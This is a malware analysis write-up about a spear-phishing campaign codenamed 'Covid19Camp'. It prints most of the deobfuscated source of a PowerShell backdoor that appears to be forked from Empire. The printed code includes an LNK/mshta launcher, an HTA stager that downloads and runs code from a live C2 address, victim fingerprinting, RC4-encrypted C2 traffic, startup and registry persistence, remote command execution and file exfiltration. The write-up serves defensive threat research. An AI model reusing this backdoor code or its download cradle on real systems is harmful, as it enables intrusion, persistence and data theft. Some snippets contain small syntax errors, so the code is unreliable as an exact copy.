## Unknown Threat Actor in Russia
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Victimology](Victimology)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Translated Documents](#Documents)
  + [Link Anyrun](#Links-Anyrun)
  + [Articles](#Articles)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is an lnk file probably push on a spear-phishing in using the fact as shortcut, this show the icon of a word document to lure its victim. This use dos command for sets the variables and use mshta command for download and execute the next stager on a zip if the lnk isn't present or execute it directly. We can note that this uses the obfuscation techniques shown by Daniel Bohannon conferences and pushed on the invoke-obfuscation tool.<h6>

```bash 
REM m = mshta
REM a = Рекомендации_МИР.docx.lnk
"C:\Windows\System32\cmd.exe" /v /c set m=m^s^h^ta && set a=Р^екоменд^ации_МИР.do^cx.lnk && if exist !cd!\!a! (!m! !cd!\!a!) else (!m! !temp!\Temp1_Рекомендации.zip\!a!)
```

<h6>The second stager use another method for decode the data in memory by converting as SecureString with a key as obfuscation method. The method and the regex of the variable used, match with the emotet loader from the malware campaign in 2018-2019. Once the concept understands with a payload converted as SecureString with the key and replace the key and the payload on the structure, this can be easily reused by any attacker, this probably the case here.</h6>

```csharp
([RUNtime.iNtErOPsErVICeS.MARsHaL]::([RuntIme.INteROpSeRviCES.MArShAl].gEtMEMBeRs()[2].NaME).InvokE([RUnTImE.InteRopSERVICEs.MarSHAL]::sEcUrEStRiNgTOGLobaLAlloCUnICoDE( $('76492d1116743f0423413b1 [...] IAMQA5AGYANwBiADAAMAAwAA=='| COnVertTO-secUReStriNg -key  105,89,16,42,117,124,77,191,238,159,97,28,11,240,17,77,146,79,194,114,84,201,175,239,28,47,34,187,155,172,91,31))) )| .((GV '*MDR*').nAme[3,11,2]-JOIN'')
```

<h6>For decrypt it, we use "SecureStringToBSTR" method for managed SecureString object to copy resident in memory to pointer with address reference, finally rest to use "PtrToStringAuto" for copies all characters from the address on the designed variable and get the value in memory.</h6>

```csharp
$str='76492d1116743f0423413b1 [...] IAMQA5AGYANwBiADAAMAAwAA=='| COnVertTO-secUReStriNg -key  105,89,16,42,117,124,77,191,238,159,97,28,11,240,17,77,146,79,194,114,84,201,175,239,28,47,34,187,155,172,91,31
$res=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($str) )
set-content -value $res -path $path
```

<h6>By looking quickly at the obfuscation of the payload, one can notice the use of the same methods as the tool previously reported.</h6>

```csharp
${lNKN`A`me}       = ("{2}{1}{0}{3}"-f 'Updater','ice','Off','.lnk')
${lN`KTA`RGeT}     = ('/v'+' '+'/c'+' '+'m'+'shta '+"`"!cd!\")+${l`NkName}+"`""
```

<h6>The first blocks of the code of the final layer are the global values for the scripts and the variables for the configuration of the payload. This content the C2, page to contact (for building URL for contact and persistence), the reference of the campaign of the attacker, filename of the lnk persistence, code for check the network disponibility, the encoding of the characters and keys for the module and registration on the panel C2. We can note that attacker use "Covid19Camp" as name code for theirs operations, this will be interesting for the victimology, the strategy and the movements done by the attackers.</h6>

```csharp
SeT-varIaBle jHTXC  ([TYPE]("syStem.TeXT.encOdING")  )  ;
$826 =[tYpe]("sYsTEm.inTpTR")  ;
set-ITeM VaRIABLe:H6jT  (  [TYPe]("SyStEm.secURiTy.cryPTOGraPHY.hAshAlGoRIthM") ) ;
SEt T2aY (  [type]("SYStem.nET.WeBreQuest")) ;
SV  Z3eb9M  ([TYPe]("syStem.iO.memORysTrEam") )  ;
Set-VARIABlE  m5E (  [type]("O.FiLe")  ) ;
$jEs =  [TypE]("COnVert")  ;
SEt-variAbLe  t2ZMW  (  [TyPe]("ENVirONmEnT"))  ;
SET-varIaBle  5ZSh ([TYPe]("SCripTbLOCK")) ;
$6Pl =[TYPE]("sYSTem.StringspLItoPTioNS")  ;
  
${hostNAme}      = ${Env:comPUTeRNAme}
${uSERnAME}      = ${EnV:UserNAMe}
${caMpAIGNiD}    = "Covid19Camp"
${rEMoTEHoSt}    = "http://95.179.252.217"
${gETSTaBpaTH}   = "load.php"
${comMANDpath}   = "web/index.php?r=cmd"
${REgIsTrYPATh}  = "HKCU:\Software\Classes\"
${reGisTEredKeY} = "Registered"
${MOdUlEsKey}    = 'TM'
${hasHhOSTkey}   = 'THH'
${wAITiNGTRIG}   = "waiting"
${sLeePTimeseC}  = 30
${lNKNAme}       = "OfficeUpdater.lnk"
${lNKTARGeT}     = ('/v /c mshta '+""!cd!\")+${lNkName}+"""
${pOlyGLOtHTa}   = '<html><script type="text/javascript">function mGMxD(YybYw,IUleC){var HQhtk=[];for(var i=0;i<YybYw.length;i+=1){HQhtk.push(String.fromCharCode(YybYw[i]^IUleC.charCodeAt(i%IUleC.length)))}return HQhtk.join("")};eval(mGMxD("22aaY44aaY22aaY6aaY14aa [...] aaY73aaY108aaY67".split("aaY"), "aExb"))</script></html>'
${eNcODiNG} =   $jhTxC::"UtF8"
```
<h6>In removing the obfuscation of the code (Xor operations), we can see the code used for check the connectivity of victim to internet for triggers the download and execution of the backdoor, this is the code of the persistence module of the Powershell backdoor.</h6>

```javascript
'<html>
<script type="text/javascript">
function decrypt(tab,key)
{
	var str=[];
	for(var i=0;i<tab.length;i+=1)
	{
		str.push(String.fromCharCode(tab[i]^key.charCodeAt(i%key.length)))
	}
	return str.join("")
};
eval(decrypt"22aaY44aaY22aaY6aaY14aa [...] aaY73aaY108aaY67".split("aaY"), "aExb"))
</script>
</html>'

window.resizeTo(0,0);
var toexecute = "-nop -c while(!(.(Test-Connection "google.com" -q)) {&("Start-Sleep") -s 5} .(iex)(.("New-Object") ("Net.WebClient").("DownloadString").InVokE((http://95.179.252.217/load.php))";
(new ActiveXObject("Shell.Application")).ShellExecute("powershell.exe", toexecute, "", "", 0);
window.close();
```

<h6>The next block is the functions for getting the system and user informations for the registration of the victim to the attacker's framework.</h6>

```csharp
function gET-winVEr {return (&("Get-ItemProperty") (HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion)."pRoDUcTNamE"}
function GeT-BITNEss 
{
  if ( (VaRiAbLE  826 ).ValUe::"sIZE" -eq 4) {return 'x86'}
  return 'x64'
}
function gET-ISiNAD
{
  if ((&("Get-WmiObject") ("Win32_ComputerSystem"))."PARToFdOMAIn" -eq ${TrUe}) { return (&("Get-WmiObject") ("Win32_ComputerSystem"))."DoMAIN"} 
  return ${FAlSE}
}
function gEt-ISloCAlaDmin
{
  [string] ${mE} = &("whoami") ("/groups") ("/fo") ("csv") | &("convertfrom-csv") | &("where-object") { ${_}."SiD" -eq ("S-1-5-32-544") }  // Administrators
  if (${me}.("ToString").Invoke().("Contains").Invoke(BUILTIN\Administrator) {return ${TRUe}} 
  return ${FALSE}
}
function geT-CLieNTiD
{
  return ("AppX") + ( (gi  VARIablE:jEs ).VaLUE::"ToBAse64StriNg"(${encOdING}.("GetBytes").Invoke(${HOSTnaME} + ${USeRnAme} + ${cAMPaiGNID}))).("ToLower").Invoke()
}
function ChEck-REg(${CLIEnTId})
{
  ${PATh} = ${REgisTrYpATh} + ${clieNTId}
  return &("Get-ItemProperty") -Path ${PaTh} -Name ${REGiSTeRedKEY} -ErrorAction ("SilentlyContinue")
}
```

<h6>The following code is the algorithm for decrypt and encrypt in RC4, we can note that the structure and the code are the same that Empire payload, this can be a fork from an Empire framework.</h6>

```csharp
function CoNvErT-RC4 
{
  param(
      [Byte[]]${DaTa},
      [Byte[]]${kEy}
    )
  [Byte[]]${BuFFer} = &("New-Object") ("Byte[]") ${DAta}."LeNgTH"
  ${dAtA}.("CopyTo").Invoke(${BUFFer}, 0)
  [Byte[]]${s} = &("New-Object") ("Byte[]") 256
    [Byte[]]${K} = &("New-Object") ("Byte[]") 256
    for (${i} = 0; ${I} -lt 256; ${I}++)
    {
        ${s}[${i}] = [Byte]${i}
        ${K}[${i}] = ${Key}[${i} % ${KeY}."LENgTh"]
    }
    ${J} = 0
    for (${I} = 0; ${I} -lt 256; ${i}++)
    {
        ${J} = (${J} + ${s}[${i}] + ${k}[${I}]) % 256
        ${TEMP} = ${S}[${I}]
        ${S}[${i}] = ${S}[${J}]
        ${s}[${j}] = ${tEMp}
    }
    ${I} = ${J} = 0
    for (${x} = 0; ${X} -lt ${bUFfER}."LENgTh"; ${X}++)
    {
        ${I} = (${i} + 1) % 256
        ${j} = (${J} + ${s}[${I}]) % 256
        ${TemP} = ${S}[${i}]
        ${s}[${I}] = ${s}[${J}]
        ${S}[${J}] = ${temp}
        [int]${T} = (${s}[${i}] + ${S}[${J}]) % 256
        ${bUFFEr}[${X}] = ${BUFfEr}[${X}] -bxor ${s}[${T}]
    }
  return ${BUFFer}
}
function gET-sTRINghAsh 
{
  param(${STRInG},${HashnaMe} = "MD5")
  ${StRINGbuilDeR} = &("New-Object") ("System.Text.StringBuilder")
   $h6jT::("Create").Invoke(${HaShName})."cOMpUtEhASH"(${ENcodING}.("GetBytes").Invoke(${STrINg}))|&('%'){[Void]${STRINGBuiLdEr}.("Append").Invoke(${_}.("ToString").Invoke("x2"))}
  return ${stRinGbuILDer}.("ToString").Invoke()
}
function ENCrYpt-DaTA
{
  param(${DAta}, ${KEY})
  [Byte[]]${BYTEENC} = ${EnCodiNg}.("GetBytes").Invoke(${DAta})
  [Byte[]]${ByTEKEY} = ${eNCoDInG}.("GetBytes").Invoke(${KeY})
  ${eNCrypTEdbYTeS} = &("Convert-Rc4") ${bYTeENC} ${ByTEkey}
  return ${ENCRYPtedByTEs}
}
function DecRyPT-DaTA
{
  param(${daTA}, ${kEY})
  [Byte[]]${bytekEy} = ${EnCODiNg}.("GetBytes").Invoke(${Key})
  ${dEcRyPTEDBYtES} = &("Convert-Rc4") ${DaTA} ${byTeKEY}
  return ${eNCODING}."GeTSTRiNG"(${decRypTEdbyteS})
}

```

<h6>The next three functions are for sending the data to the C2 with the built URL from the global variables.</h6>

```csharp
function SenD-WEbRequeST
{
  param(${URI},${mEThOD},${Body})
  ${REQuEsT}                                    = (gi vARiaBLE:T2ay).ValUe::("Create").Invoke(${URi})
  ${reQUesT}."TiMEoUt"                          = 10000
  ${rEQUEST}."metHod"                           = ${MethOD}
  ${RequESt}."USEragENt"                        = "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
  ${ReqUest}."CoNtEnTTyPE"                      = "text/html"
  ${rEQuest}."seRvIcEPOInT"."eXpect100CONTiNue" = ${FAlse}
  ${reqUEst}."kEEPALIVe"                        = ${tRUe}
  ${reQueST}."aCCepT"                           = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
  ${rEQUest}."HEadERS"["Accept-Language"]       = "en-US,en;q=0.5"
  ${reQuESt}."HeAdeRs"["Cache-Control"]         = "max-age=0"
  if(${mETHod} -eq "POST")
  {
      ${bODY} = [byte[]][char[]]${boDy}
      ${upSTReAM} = ${ReqUeSt}.("Cache-Control").Invoke()
      ${uPsTREAm}.("Write").Invoke(${bodY}, 0, ${boDY}."LeNgTh")
      ${UPStREaM}.("Flush").Invoke()
      ${UpSTREAm}.("Close").Invoke()
  }
  ${REsPonse} = ${reqUEsT}.("GetResponse").Invoke()
  ${STREaMReadER} = [System.IO.StreamReader](${reSpONSe}.("GetResponseStream").Invoke())
  ${oUTsTREAm} =   (geT-VAriABle  z3eB9m  -vAlueon)::("new").Invoke()
  ${sTreAMREaDEr}."BAsesTrEAM".("CopyTo").Invoke(${OuTSTrEaM})
  ${REs} = ${OUtstREaM}.("ToArray").Invoke()
  ${StrEamreaDER}.("Close").Invoke()
  ${rEspoNSE}.("Close").Invoke()
  return ${reS}
}
function SENd-TOhoST 
{
  param(${DaTa})
  try
  {
    ${uRI} = ${ReMOTEhoST} + "/" + ${COmManDPAtH}
    ${resUlt} = &("Send-WebRequest") -uri ${URI} -method ("POST") -body ${DATA}
  } catch { return ''}
  return ${reSUlt}
}
function prEpARE-ReqUEst
{
  param(${DAtA}, ${INTERnAlUsEriD}, ${InterNALUsErkEy})
    ${ENcRyPTed} = &("Encrypt-Data") ${daTa} ${INTERnaluSERkeY}
    ${APpENDIX} = ${iNTERNAlUSERiD} + ';'
    ${APpENdiXBYtEs} = ${eNCodING}.("GetBytes").Invoke(${APpeNDIX})
    ${ENCrYPTed} = ${ApPeNDixbYTES} + ${eNCRYPtEd} 
    return ${eNcRyPTEd}
}
```

<h6>The next function are used fro register the new victim to C2 and set or remove the persistence on the system.<h6>

```csharp
function ReGIstEr-TiNy
{
  ${isAdMin} = &("Get-IsLocalAdmin")
  ${ISINAD}  = &("Get-IsInAd")
  ${BITneSs} = &("Get-Bitness")
  ${WINVer}  = &("Get-WinVer")
  ${rEGSTr} = "username:"+${usERNAme}+';'+"hostname:"+ ${HOsTNAme}+';'+"localprivs:"+${isAdMIN}+';'+"partofad:"+${ISInad}+';'+"bitness:"+${biTnesS}+';'+"winver:"+${WInVer}+';'
  ${ENcRyPtEd} = &("Encrypt-Data") ${rEGSTR} ${caMpAIGnid}
  ${reSPonSE}  = &("Send-ToHost") ${ENCRyPTEd}
  ${IdANDkEY}  = &("Decrypt-Data") ${reSpONsE} ${CAMPaiGNid}
  if(${idAnDkEY}.("contains").Invoke(";")) { return ${IdAndKEy}}
  else { Exit(0) }
}
function CHeck-REMOteHOst
{
    ${clIEntiD} = &("Get-ClientID")
    ${pATh} = ${REGistRYpAtH} + ${CLientID}
    ${saVEDHAsH} = &("Get-ItemProperty") -Path ${PaTH} -Name ${hAShHOsTkeY} -ErrorAction ("SilentlyContinue")
    ${CURRenTHasH} = &("Get-StringHash") ${rEmOTEHoSt}
    if(!${SAveDHasH} -or ${sAVedHash}."THH" -ne ${cURREnThash}) {
        &("New-ItemProperty") -Path ${PATH} -Name ${haSHHoSTkEy} -Value ${cURrENtHAsH} -PropertyType ("String") -Force | &("Out-Null")
        &("Drop-Lnk")
    }
}
function DrOp-LNK
{
  ${LNkPaTH} =   (Ls  ('VArIABLE:t2zmw')).VAlUe::("GetFolderPath").Invoke(("Startup")) + '\' + ${LNKNAMe}
  if(&("Test-Path") ${LnKpaTh}) { &("Remove-Item") -Path ${lNKPATH} -Force }
  ${wSH} = &("New-Object") -comObject ("WScript.Shell")
  ${lNk} = ${WSh}.("CreateShortcut").Invoke(${LnKpAth})
  ${LNK}."TARgetPaTh" =  $T2zMW::("GetFolderPath").Invoke(("System")) + "\cmd.exe "
  ${LNK}."ARGuMenTs" = ${LnKTaRgET}
  ${LNK}."wORKiNgDirecToRY" =  (geT-VariABlE  T2zMW -valU  )::("GetFolderPath").Invoke(("Startup"))
  ${lNK}."wiNDOWsTyLe" = 7
  ${lNk}.("Save").Invoke()
  ${boDY} =  (GEt-VaRiabLE  M5E -vAlU)::("ReadAllBytes").Invoke(${LNkpaTH})
  ${BODY} = ${BODY} + ${ENCODiNg}.("GetBytes").Invoke(${POlygLoThta})
    ( VariaBlE  ('M5E')  ).vALUE::("WriteAllBytes").Invoke(${lNkPaTH}, ${bOdY})
}
function get-peRsISTAnCE
{
 param(${INteRNaluSeRiD}, ${INTERnALUseRkEy}, ${ClIENTiD})
  ${PaTH} = ${registRYpAth} + ${clieNTid}
  ${tOSaVE} = ${iNtErNalUserID} + ';' + ${InTeRNALUsERkey}
  if(!(&("Test-Path") ${paTH})) {
    &("New-Item") -Path ${paTh} -Force | &("Out-Null")
  }
  ${CURRenthAsH} = &("") ${rEMOTEHost}
  &("New-ItemProperty") -Path ${pAth} -Name ${rEGIsteREdkeY} -Value ${toSAVe} -PropertyType ("String") -Force | &("Out-Null")
  &("New-ItemProperty") -Path ${PATh} -Name ${HashHosTkEY} -Value ${cuRrENTHAsh} -PropertyType ("String")) -Force |  &("Out-Null")
  &("Drop-Lnk")
}
function DEleTe-TINY
{
  ${AutOlOadlNK} =   ( GCI  VArIAbLe:t2zmW).VaLuE::("GetFolderPath").Invoke(("Startup")) + '\' + ${lnkNaMe}
  &("Remove-Item") -Path ${auTOLoAdLNK} -Force
  ${cliEntID} = &("Get-ClientID")
  ${ReG} = ${rEGIstRYpAth} + ${clIEntID}
  &("Remove-Item") ${Reg} -Recurse
  Exit(0)
}
```

<h6>The penultimate function block contains the rest of the backdoor functionalities.</h6>

```csharp
function reAd-FilE
{
  param(${PAth})
  ${bAsE64sTRing} =  ( geT-variaBLe JEs ).vAlUE::"TobAsE64sTrinG"(  $M5E::("ReadAllBytes").Invoke(${PATH}))
  ${fiLenAMe} = &("Split-Path") ${pATh} -leaf
  ${DAta} = ("download:")+ ${FiLEName} + ';' + ${Base64StRiNg}
  return ${daTA}
}
function GENErAte-lOg
{
 param(${dAtA})
 ${BAse64StRING} =   (gET-vArIABlE ("JeS") ).ValUe::"tObAsE64striNG"(${ENcOdINg}.("GetBytes").Invoke(${DATA}))
 ${NAmE} = -join ((48..57) + (97..122) | &("Get-Random") -Count 32 | &('%') {[char]${_}})
 ${dATA} = ("download:")+ ${NAMe} + (".log") + ';' + ${bAse64StRinG}
 return ${daTA}
}

function ExecuTe-stANDARtCOmMAND 
{
  param(${dECryptED}, ${iNteRNAlUsErId}, ${INTERnaLUserKeY})
    ${dECRYPTed} = ${dEcryPTEd}.("substring").Invoke(5)
    try{
        ${rES} = (&("Invoke-Expression") ${DECrypted}) | &("Out-String")
        if(${res}."LeNgtH") 
        {
            ${lOg} = &("Generate-Log") ${rEs}
            ${LOG_uPlOad} = &("Prepare-Request") ${LOg} ${INTeRNALUseRiD} ${INTERNalUSerKEy}
            &("Send-ToHost") ${LOG_uPLOAD}
        }
    } catch {}
}
function doWNlOAd-FILE 
{
  param(${decRypteD}, ${iNTERnaLUSErId}, ${InTerNalUSErKey})
    ${DEcRypTeD} = ${decRypTeD}.("substring").Invoke(9)
    try
    {
        ${fiLe} = &("Read-File") ${DecRyPTED}
        ${FILe_UplOAD} = &("Prepare-Request") ${File} ${IntERnaLUsErid} ${iNterNALuseRkey}
        &("Send-ToHost") ${FiLE_upLoAd}
		${Log} = &("Generate-Log") "file_uploaded"
        ${lOg_upLOAD} = &("Prepare-Request") ${LOg} ${iNTeRnAlUsERID} ${INterNALuSERkeY}
        &("Send-ToHost") ${log_uplOad}
    } catch {}
}
function chaNGe-timeOUt
{
  param(${DeCRYPTeD}, ${INtERNALusEriD}, ${INTeRnAlUSeRkEY})
    ${DECRypTED} = ${DecRYPTEd}.("substring").Invoke(14)
    ${rES} = ${sleEptIMeseC}
    if(${deCrYpTeD} -match "^[\d\.]+$") 
    {
	    ${loG} = &("{3}{2}{0}{1}"-f'a','te-Log','ener','G') "wait_time_changed"
        ${rEs} = ${deCrYpTEd}
    } 
    else { ${Log} = &("Generate-Log") "incorrect_value" }
    ${lOg_UploAD} = &("Prepare-Request") ${log} ${INTeRnAluSerid} ${INtERnalUSerKEy}
    &("Send-ToHost") ${log_uPlOAD}
    return ${RES}
}
function uPDaTE-Tiny
{
  param(${INTerNALuserid}, ${intERNaLusERkeY})
    try
    {
        ${tArGET} =  $T2zmW::("GetFolderPath").Invoke(("Startup")) + '\' + ${lNKnAMe}
        &("Invoke-Expression") ("cmd /c mshta" + """ + ${TARGeT} + """)
        ${LoG} = &("Generate-Log") ("implant_updated")
        ${log_UploAD} = &("Prepare-Request") ${LOG} ${INternALusERID} ${inTErnAlUseRkeY}
        &("Send-ToHost") ${lOg_UplOad}
        Exit(0)
    } catch {}
}
function geT-modUle {
  param(${mOdUleiD}, ${iNTeRnALuSErID}, ${INTErNALuSERkey})
    if(${mODUlEID}."lEnGTh" -lt 1) { return ''}
    ${DAtA} = ("get_module:") + ${ModulEId}
    ${reQUest} = &("Prepare-Request") ${dATA} ${inTeRnAlusErId} ${iNTErnalusErKEY}
    ${ResPonsE} = &("Send-ToHost") ${ReqUeST}
    if(${REsPONsE}."leNGTh" -lt 1) { return '' }
    ${mODULeBoDy} = &("Decrypt-Data") ${rESpONse} ${inTeRNALUsERkeY}
    return ${MOdUleBODy}
}
function rUN-moDule 
{
  param(${moDULeId}, ${INTeRNalUSeRiD}, ${iNTERNAluSeRKEY}, ${vOIDLog})
    ${OPERationLOG} = ''
    ${res} = ${faLsE}
    try { ${mOdULeboDY} = &("Get-Module") ${MODulEid} ${iNteRNAlusErId} ${InTERnAlUSeRKey} } 
    catch {}
    if(${MOduleBody}."leNgTh" -gt 0) 
    {
        try 
        {
            ${ScRiPTBlOck} =   $5ZsH::("Create").Invoke(${mODuLEboDY})
            ${OPERaTiONLOG} = &("Start-Job") -ScriptBlock ${sCriptBloCK} | &("Out-String")
            ${rEs} = ${tRue}
        } 
        catch { ${opERaTioNlOG} = "can't_create_job"}
    } 
    else{ ${oPeRaTioNLOG} = ("incorrect_module_id") }
    if(${oPeRaTioNLog}."lenGTH" -gt 0 -and !${VoIdloG}) {
        ${LoG} = &("Generate-Log") ${oPeRATioNLOG}
        ${lOG_uPloAD} = &("Prepare-Request") ${Log} ${InTERnALuSerid} ${IntErNALUsERkEY}
        &("Send-ToHost") ${LoG_uPLOAD}
    }
    return ${REs}
}
function adD-PErsistModUlE {
    param(${RAwmoDuleiD}, ${INTeRNALUSErId}, ${iNTerNALUseRKEy})
        ${rEs} = ''
        ${MoDulEID} = "{" + ${rawmodUlEID} + "}"
        ${cLIeNTID} = &("Get-ClientID")
        ${pATh} = ${rEgistryPaTh} + ${clIeNtId}
        ${aLreAdyAcTIVe} = &("Get-ItemProperty") -Path ${PATH} -Name ${MOdULEsKEY} -ErrorAction ("SilentlyContinue")
        if(${aLrEADYacTIVe}) 
        {
            if(${AlrEaDyacTIVe}."tM".("Contains").Invoke(${mOdUleId})) { ${reS} = ("module_with_this_id_is_active_already") } 
            else 
            {
              ${tOsaVe} = ${alrEAdyaCtIVE}."TM" + ${mODUleiD}
              if(&("Run-Module") ${rAwModUleId} ${INtERNAlUSeRId} ${iNtErNAlUsERKeY})
              {&("New-ItemProperty") -Path ${PATh} -Name ${ModULesKey} -Value ${tosAVe}  -PropertyType ("String") -Force | &("Out-Null")}
            }
        }
        else 
        {
            if(&("Run-Module") ${raWMODuLEID} ${INterNAlUsErID} ${iNTerNALuSeRkey}) 
            { &("New-ItemProperty") -Path ${pATh} -Name ${mODUlesKey} -Value ${MODULEID} -PropertyType ("String") -Force | &("Out-Null")}
        }
        if(${res}."lengtH" -gt 0) 
        {
            ${lOG} = &("Generate-Log") ${REs}
            ${lOg_UPlOAD} = &("Prepare-Request") ${loG} ${INTeRNaLuSERId} ${INTerNAlUserkey}
            &("Send-ToHost") ${lOG_UplOAd}
        }
}
function ReMOVe-PerSiSTmodULe 
{
    param(${raWmoDULEId}, ${iNTerNalUserId}, ${iNTERNAlUserkeY})
        ${rEs} = ''
        ${ModULEiD} = "{" + ${RAWmoDuLeID} + "}"
        ${cLIENtId} = &("Get-ClientID")
        ${PaTH} = ${rEgIstRypaTh} + ${clieNTid}
        ${alReAdyAcTIVe} = &("Get-ItemProperty") -Path ${PATh} -Name ${moDULESKey} -ErrorAction ("SilentlyContinue")
        if(${ALREaDYActive}) 
        {
           if(${AlreaDYACtiVe}."Tm".("contains").Invoke(${MODulEiD})) 
           {
                ${TOsavE} = ${ALREADyACTiVE}."tM".("replace").Invoke(${moDULeid}, "")
                &("New-ItemProperty") -Path ${PATH} -Name ${MoDuLesKey} -Value ${TOsAVe}  -PropertyType ("String") -Force | &("Out-Null")
                ${rEs} = "module_removed"
           }
           else {  ${rEs} = "can't_find_this_module" }
        }
        else { ${RES} = "nothing_to_remove" }
        if(${ReS}."lENGTh" -gt 0) 
        {
            ${log} = &("Generate-Log") ${REs}
            ${Log_UplOAd} = &("Prepare-Request") ${LOg} ${iNTeRnALUseRid} ${InterNaLusERkEy}
            &("Send-ToHost") ${lOg_UpLOAD}
        }
}
function LOaD-ALlPeRSIsTMODulES
{
    param(${iNTErNaLUsERId}, ${iNTErNalUSERkeY})
    try{
        ${CliENtId} = &("Get-ClientID")
        ${PATh} = ${REgisTRYpATh} + ${clienTid}
        ${alreAdyaCTIVE} = &("Get-ItemProperty") -Path ${pATH} -Name ${MODuleskey} -ErrorAction ("SilentlyContinue")
        if(!${alrEADYACTiVe}) {return}
        if(${AlREADYaCtIVe}."tm"."lENgTh" -lt 1) {return}
        ${IDSaRrAy} = ${ALreadYacTiVE}."tm"."SplIT"('{',(gET-VARiAbLe ("6pl")).valUe::"REMOVEemPTyeNTrIes")
        foreach (${id} in ${idSARRAY}) {
            ${iD} = ${Id}.("replace").Invoke('}', '')
            ${Res} = &("Run-Module") ${Id} ${InTERNaLusERId} ${inTeRnAluseRkeY} ${trUe}
        }
    } catch {}
}
```

###### The last block of code is the loop for acquiring the orders of the attacker and the loading of the registration of the new victim. We can see that the parsing algorithm is more near a programmer used to coding in python (absence of switch capacity), this use multiple time elseif for the parsing command system. 

``` csharp
function STaRT-mAinLoop
{
  param(${iNTeRnAlUseRiD}, ${INTeRNaLuSErKeY})
  while (${TRue}) {
    &("Start-Sleep") -s ${SLEEPtiMESec}
    try
    {
      ${rEQUESt} = &("Prepare-Request") ${WaItiNGTRIg} ${intERNALUseRid} ${inTErnAlUseRkey}
      ${comMaND} = &("Send-ToHost") ${rEquEsT}
      if(${ENcODING}."GEtsTRiNg"(${COMmAND}) -eq ("delete")) {&("Delete-Tiny")}
      ${decRYPtED} = &("Decrypt-Data") ${CoMmAND} ${iNteRnAlUSeRkEy}
      if(${decrypTEd}.("contains").Invoke("exec:")) {&("Execute-StandartCommand") ${DECRyPted} ${InTERnaLUSerID} ${InTERNALuserkEY}} 
      elseif(${DecRYpteD}.("contains").Invoke("download:")) {&("Download-File") ${deCryPTED} ${iNteRNALUsERId} ${iNTerNaLUserkeY}}
      elseif(${deCRypTEd}.("contains").Invoke("set_wait_time:")) {${SLEEpTImESEC} = &("Change-Timeout") ${dEcryPtEd} ${InTErNALuSErId} ${InTERnaLuSERkEY}}
      elseif(${DeCrypTEd} -eq ("update_tiny")) {&("Update-Tiny") ${INTeRnAlUSerID} ${iNTeRNAlUserKey}}
      elseif(${dECRyptEd}.("contains").Invoke(("run_module:"))) {&("Run-Module") ${dECryPteD}.("substring").Invoke(11) ${InteRnALUSEriD} ${iNtERnAlUsERKeY}}
      elseif(${dECRYPTEd}.("contains").Invoke("add_persist_module:")) {&("Add-PersistModule") ${DeCryPTED}.("substring").Invoke(19) ${INTERNalUseRid} ${INTeRnALuserkeY}}
      elseif(${DECrYptED}.("contains").Invoke("remove_persist_module:")) { &("Remove-PersistModule") ${DeCRyPTed}.("substring").Invoke(22) ${iNternALUsERiD} ${InTeRnalusERkEY}}
    } catch {}
  }
}
function sTArT-tInY
{
  ${INTerNaLuSeRID} = 0
  ${iNTerNaLusERKeY} = ''
  ${ClieNtiD} = &("Get-ClientID")
  ${IsREg} = &("Check-Reg") ${ClientID}
  if(!${ISReG}) 
  {
    ${iDaNdkey} = &("Register-Tiny")
    ${iNTeRNaLUserID}, ${iNteRnaLUSERKEY} = ${IDaNDkEY}.("Split").Invoke(';')
    &("Get-Persistance") ${intERNAlUSERid} ${iNTErNAluSErKEY} ${cLieNTiD}
  } 
  else 
  {
    ${interNalUSERid}, ${InTErnALusErkEY} = ${iSReg}."REgisTEreD".("Split").Invoke(';')
    &("Check-RemoteHost")
    &("Load-AllPersistModules") ${inTERNALUsERId} ${InTERNAlUsERKEY}
  }
  &("Start-MainLoop") ${InTernaLUSErid} ${iNTERNALusERKey}
}

&("Start-Tiny")
```

<h6>Using the last sentence, we can compare the code used with a correct and code optimized, we can use an equivalent of a referential like "this" ($ _) for using the variable and parse it, this allows to confirm the low level in the skill coding, that explain why code shares and that the backdoor is a fork of the Empire framework.</h6>

``` csharp
if(${decrypTEd}.("contains").Invoke("exec:")) {&("Execute-StandartCommand") ${DECRyPted} ${InTERnaLUSerID} ${InTERNALuserkEY}} 
elseif(${DecRYpteD}.("contains").Invoke("download:")) {&("Download-File") ${deCryPTED} ${iNteRNALUsERId} ${iNTerNaLUserkeY}}
elseif(${DeCrypTEd} -eq ("update_tiny")) {&("Update-Tiny") ${INTeRnAlUSerID} ${iNTeRNAlUserKey}}

switch (${decrypTEd})) 
    {
        {$_.contains("exec:")} {&("Execute-StandartCommand") ${DECRyPted} ${InTERnaLUSerID} ${InTERNALuserkEY}}
        {$_.contains("download:")} {&("Download-File") ${deCryPTED} ${iNteRNALUsERId} ${iNTerNaLUserkeY}}
        {$_ -eq ("update_tiny")} {&("Update-Tiny") ${INTeRnAlUSerID} ${iNTeRNAlUserKey}}
    }
```

<h6>We can resume all the commands and functionalities planned on the backdoor (eq and contains strings to match) :</h6>

<table>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
<tr>
<td>delete</td>
<td>Remove persistence and kill the session of Tiny backdoor.</td>
</tr>
<tr>
<td>exec:</td>
<td>Execute command on the system of the victim.</td>
</tr>
<tr>
<td>download:</td>
<td>Download a file on the system of the victim.</td>
</tr>
<tr>
<td>set_wait_time:</td>
<td>Push on a sleep mod for X seconds.</td>
</tr>
<tr>
<td>update_tiny</td>
<td>Update the implant by a new persistence (update done by reboot of session or computer)</td>
</tr>
<tr>
<td>run_module:</td>
<td>Run an additionnal module.</td>
</tr>
<tr>
<td>add_persist_module:</td>
<td>Add persistence for the additionnal module on the system</td>
</tr>
<tr>
<td>remove_persist_module:</td>
<td>Remove the persistence for the additionnal module on the system</td>
</tr>
</table>

<h2>Victimology <a name="Victimology"></a></h2>
